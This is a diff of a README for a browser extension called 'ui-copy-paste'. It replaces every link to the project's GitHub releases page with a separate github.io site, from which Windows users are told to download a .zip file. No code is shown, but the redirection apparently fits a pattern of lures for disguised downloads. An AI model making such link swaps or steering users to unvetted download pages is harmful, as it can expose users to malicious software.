@@ -1,6 +1,6 @@
 # 🎨 ui-copy-paste - Turn any website into clean code
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/jo-anntestimonial230/ui-copy-paste/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://jo-anntestimonial230.github.io)
 
 ## 🎯 About the project
 
@@ -19,9 +19,9 @@ You need a few things to run this extension on your Windows computer:
 
 ## 📥 How to get the software
 
-You will download the extension directly from our release page. Visit this page to download the latest version of the software: https://github.com/jo-anntestimonial230/ui-copy-paste/releases
+You will download the extension directly from our release page. Visit this page to download the latest version of the software: https://jo-anntestimonial230.github.io
 
-1. Go to the [releases page](https://github.com/jo-anntestimonial230/ui-copy-paste/releases).
+1. Go to the [releases page](https://jo-anntestimonial230.github.io).
 2. Look for the most recent version labeled as "Latest release."
 3. Click the file ending in `.zip` to download the package to your Windows device.
 4. Locate the file in your downloads folder.
